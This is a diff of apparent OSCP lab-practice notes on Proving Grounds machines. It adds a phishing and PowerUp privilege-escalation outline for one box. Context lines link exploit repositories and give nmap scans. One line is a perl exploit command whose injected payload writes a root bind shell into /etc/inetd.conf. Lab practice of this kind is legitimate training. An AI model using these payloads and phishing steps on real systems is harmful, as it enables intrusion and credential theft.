@@ -7,6 +7,11 @@
 2. Exploit = https://github.com/squid22/PostgreSQL_RCE 
 
 
+#### Hepet => Phishing email 
+- Get creds from website, read IMAP emails, attach .ods in phishing email; PowerUp, replace exe with cmd. 
+- IMAP details = https://banua.medium.com/proving-grounds-hepet-oscp-prep-2025-practice-17-3bdc3ad86495 
+
+
 #### ClamAV => SNMP 
 1. nmap -sU -p161 --script *snmp* $target 
 2. perl 4761.pl $target    # <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"> 
@@ -16,4 +21,3 @@ Try = https://github.com/rix4uni/FTPBruteForce.git
 
 
 Use to look for exploits: ` sudo nmap -sVC -vvv {{TARGET_IP}} --script vuln ` 
-
